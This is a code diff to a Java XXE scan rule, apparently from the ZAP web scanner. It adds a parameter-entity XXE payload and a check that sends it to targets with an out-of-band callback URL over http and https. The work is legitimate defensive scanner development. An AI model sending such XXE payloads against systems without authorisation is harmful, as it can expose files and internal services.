@@ -67,9 +67,19 @@ public class XxeScanRule extends AbstractAppPlugin {
                     + "  <!ENTITY zapxxe SYSTEM \"{0}\">\n"
                     + "]>\n";
 
+    static final String PARAMETER_ENTITY_ATTACK_HEADER =
+            "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n"
+                    + "<!DOCTYPE foo [\n"
+                    + "  <!ELEMENT foo ANY >\n"
+                    + "  <!ENTITY % zapxxe SYSTEM \"{0}\"> %zapxxe; \n"
+                    + "]>\n";
+
     protected static final String ATTACK_BODY = "<foo>" + ATTACK_ENTITY + "</foo>";
 
     protected static final String ATTACK_MESSAGE = ATTACK_HEADER + ATTACK_BODY;
+
+    protected static final String PARAMETER_ENTITY_ATTACK_MESSAGE =
+            PARAMETER_ENTITY_ATTACK_HEADER + ATTACK_BODY;
 
     // XML standard from W3C Consortium
     // ---------------------------------------------
@@ -193,7 +203,8 @@ public class XxeScanRule extends AbstractAppPlugin {
             remoteFileInclusionAttack();
 
             // Check #2 : Out-of-band XXE Attack
-            outOfBandFileInclusionAttack();
+            outOfBandFileInclusionExternalEntityAttack();
+            outOfBandFileInclusionParameterEntityAttack();
 
             // Check if we've to do only basic analysis (only remote should be done)...
             if (this.getAttackStrength() == AttackStrength.LOW) {
@@ -250,7 +261,7 @@ public class XxeScanRule extends AbstractAppPlugin {
         }
     }
 
-    private void outOfBandFileInclusionAttack() {
+    private void outOfBandFileInclusionExternalEntityAttack() {
         try {
             ExtensionOast extOast =
                     Control.getSingleton().getExtensionLoader().getExtension(ExtensionOast.class);
@@ -275,6 +286,38 @@ public class XxeScanRule extends AbstractAppPlugin {
             }
         } catch (Exception e) {
             LOGGER.warn("Could not perform OOB XXE File Inclusion Attack.", e);
+        }
+    }
+
+    private void outOfBandFileInclusionParameterEntityAttack() {
+        try {
+            ExtensionOast extOast =
+                    Control.getSingleton().getExtensionLoader().getExtension(ExtensionOast.class);
+            if (extOast != null && extOast.getActiveScanOastService() != null) {
+                HttpMessage msg = getNewMsg();
+                Alert alert =
+                        newAlert()
+                                .setConfidence(Alert.CONFIDENCE_MEDIUM)
+                                .setMessage(msg)
+                                .setSource(Alert.Source.ACTIVE)
+                                .build();
+                String oastPayload = extOast.registerAlertAndGetPayload(alert);
+                String payload =
+                        MessageFormat.format(
+                                PARAMETER_ENTITY_ATTACK_MESSAGE, "http://" + oastPayload);
+                alert.setAttack(payload);
+                msg.setRequestBody(payload);
+                sendAndReceive(msg);
+                // Try again with https
+                msg = getNewMsg();
+                payload =
+                        MessageFormat.format(
+                                PARAMETER_ENTITY_ATTACK_MESSAGE, "https://" + oastPayload);
+                msg.setRequestBody(payload);
+                sendAndReceive(msg);
+            }
+        } catch (Exception e) {
+            LOGGER.warn("Could not perform OOB XXE File Inclusion Parameter Entity Attack.", e);
         }
     }
 
